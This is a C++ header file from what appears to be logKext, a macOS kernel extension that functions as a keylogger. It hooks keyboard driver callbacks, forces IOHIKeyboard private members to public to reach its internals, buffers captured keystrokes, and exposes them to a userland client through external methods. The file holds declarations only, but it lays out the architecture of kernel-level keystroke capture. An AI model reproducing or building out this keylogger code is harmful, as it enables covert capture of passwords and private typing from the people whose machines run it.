/*
 *  logKext.h
 *  logKext
 *
 *  Created by Braden Thomas on Thu Sep 30 2004.
 *
 */

#ifndef LOGKEXT_H
#define LOGKEXT_H

#include "logKextCommon.h"

#include <IOKit/IOLib.h>

#include <IOKit/IOService.h>
#include <IOKit/IOUserClient.h>
#include <IOKit/ndrvsupport/IOMacOSTypes.h>

#define private public
#define protected public
#include <IOKit/hidsystem/IOHIKeyboard.h>
#undef private
#undef protected

#define DEBUG

void logAction(OSObject *,unsigned,unsigned,unsigned,unsigned,
				unsigned,unsigned,unsigned,unsigned,bool,AbsoluteTime);
				
void specialAction(OSObject *,unsigned,unsigned,unsigned,unsigned,UInt64,bool,AbsoluteTime);

class com_fsb_iokit_logKext : public IOService
{

    OSDeclareDefaultStructors(com_fsb_iokit_logKext);

	friend class logKextUserClient;

    protected:
		
		unsigned char*		fMemBuf;
        UInt32				buffsize;

		IONotifier			*notify;
		IONotifier			*notifyTerm;
				
		// notification handler
		static bool myNotificationHandler(void *target, void *ref, IOService *newServ);
		static bool termNotificationHandler(void *target, void *ref, IOService *newServ);		
		
    public:

		UInt32				kextKeys;

        // IOService overrides
		virtual bool 		start(IOService *provider);
        virtual void 		stop(IOService *provider);

		void				activate();
		void				deactivate();
		void				clearKeyboards();
		
		OSArray				*loggedKeyboards;
		
		IOReturn BuffandKeys(UInt32* size,UInt32* keys);
		IOReturn Buffer(bufferStruct* inStruct);
		
		void logStroke( unsigned key, unsigned flags, unsigned charCode );
};


/*
    This is the UserClient class that is used to talk to the driver (kext) from userland.
*/


class logKextUserClient : public IOUserClient
{
    
    OSDeclareDefaultStructors(logKextUserClient);

    protected:
        com_fsb_iokit_logKext*	fProvider;
        task_t		fTask;
        
    public:
        // IOService overrides
        virtual bool start( IOService* provider );
        virtual void stop( IOService* provider );
        
        // IOUserClient overrides
        virtual bool initWithTask( task_t owningTask,
                                    void * securityID,
                                    UInt32 type,
                                    OSDictionary * properties );
        virtual IOReturn clientClose();
        virtual IOExternalMethod* getTargetAndMethodForIndex( IOService** targetP, UInt32 index );
};

// external methods table
static const IOExternalMethod externalMethods[kNumlogKextMethods] = 
{
    {
        // ::IOReturn BuffandKeys(UInt32* size,UInt32* keys);
        NULL,
        (IOMethod)&com_fsb_iokit_logKext::BuffandKeys,
        kIOUCScalarIScalarO,		// scalar in/out
        0,							// number of scalar inputs
        2							// number of scalar outputs
    },
	{
        // ::IOReturn Buffer(bufferStruct* myStruct)
        NULL,
        (IOMethod)&com_fsb_iokit_logKext::Buffer,
        kIOUCScalarIStructO,		// scalar in/struct out
		0,							// number of scalar inputs
		sizeof(bufferStruct)		// size of structure output
    },
		
};

#endif